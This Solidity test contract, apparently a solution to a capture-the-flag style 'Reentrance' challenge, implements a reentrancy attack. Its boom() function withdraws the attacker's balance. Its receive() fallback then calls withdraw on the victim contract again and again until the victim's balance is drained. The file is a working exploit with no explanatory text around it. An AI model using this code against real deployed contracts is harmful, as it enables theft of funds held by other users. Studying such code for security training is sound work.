// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import "./Reentrance.sol";
import "ds-test/test.sol";

contract ReentranceHack is DSTest {
    function boom(address payable c) external {
        uint256 myBalance = Reentrance(c).balanceOf(address(this));

        Reentrance(c).withdraw(myBalance);
    }

    receive() external payable {
        emit log("receive");
        uint256 contractBalance = address(msg.sender).balance;
        if (contractBalance > 0) {
            uint256 withdrawAmount = contractBalance < msg.value ? contractBalance : msg.value;
            Reentrance(payable(msg.sender)).withdraw(withdrawAmount);
        }
    }
}
